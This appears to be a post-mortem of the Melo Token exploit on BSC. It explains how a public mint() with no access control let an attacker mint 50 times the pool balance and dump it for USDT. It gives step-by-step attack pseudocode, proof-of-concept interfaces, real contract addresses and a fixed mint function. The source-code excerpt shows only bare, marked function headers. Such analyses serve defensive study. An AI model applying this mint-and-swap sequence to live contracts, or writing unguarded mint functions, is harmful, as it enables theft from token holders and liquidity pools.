# Melo Token Exploit — mint() Missing Access Control

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05-02 |
| Project | Melo Token |
| Chain | BSC |
| Loss | Unconfirmed |
| Attacker | Unconfirmed |
| Attack TX | Unconfirmed |
| Vulnerable Contract | MEL Token: 0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54 |
| Block | Unconfirmed |
| CWE | CWE-284 (Improper Access Control — public mint) |
| Vulnerability Type | mint() No Access Control Allows Arbitrary Token Minting |

## Summary
The MEL token's `mint()` function had no access control modifier — any address could call it with arbitrary parameters. The attacker minted 50× the pair's MEL balance directly to their own address, then swapped the minted tokens to USDT via PancakeSwap.

## Vulnerability Details
- **CWE-284**: `MEL.mint(address account, uint256 amount, string memory txId)` contained no `onlyOwner`, `onlyMinter`, or equivalent guard. The attacker calculated the pair's MEL balance, minted 50× that amount to themselves, and immediately sold via the router.

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: cERC20.sol
    function increaseAllowance(address spender, uint256 addedValue)  // ❌

// ...

    function decreaseAllowance(address spender, uint256 subtractedValue)  // ❌

// ...

    function _transfer(  // ❌

// ...

    function mint(  // ❌

// ...

    function _approve(  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. uint256 pairBalance = MEL.balanceOf(address(MEL_USDT_Pair))
// 2. uint256 mintAmount = pairBalance * 50
// 3. MEL.mint(address(this), mintAmount, "exploit")
//    → no access control → mints 50× pair balance to attacker
// 4. MEL.approve(address(Router), mintAmount)
// 5. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//       mintAmount, 0, [MEL→USDT], address(this), deadline
//    )
// 6. Log final USDT balance
```

## Interfaces from PoC
```solidity
interface IMEL is IERC20 {
    function mint(address account, uint256 amount, string memory txId) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}
```

## Key Addresses
| Label | Address |
|---|---|
| MEL Token | 0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54 |
| MEL-USDT Pair | 0x6a8C4448763C08aDEb80ADEbF7A29b9477Fa0628 |
| USDT | 0x55d398326f99059fF775485246999027B3197955 |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |

## Root Cause
`mint()` was a public function with no access restriction. Any caller could mint an unbounded amount of MEL tokens to any address.

## Fix
```solidity
address public minter;

modifier onlyMinter() {
    require(msg.sender == minter, "Not minter");
    _;
}

function mint(address account, uint256 amount, string calldata txId) external onlyMinter {
    require(amount <= MAX_MINT_PER_TX, "Exceeds per-tx limit");
    _mint(account, amount);
    emit Minted(account, amount, txId);
}
```

## References
- BSC MEL Token: 0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54
- MEL-USDT Pair: 0x6a8C4448763C08aDEb80ADEbF7A29b9477Fa0628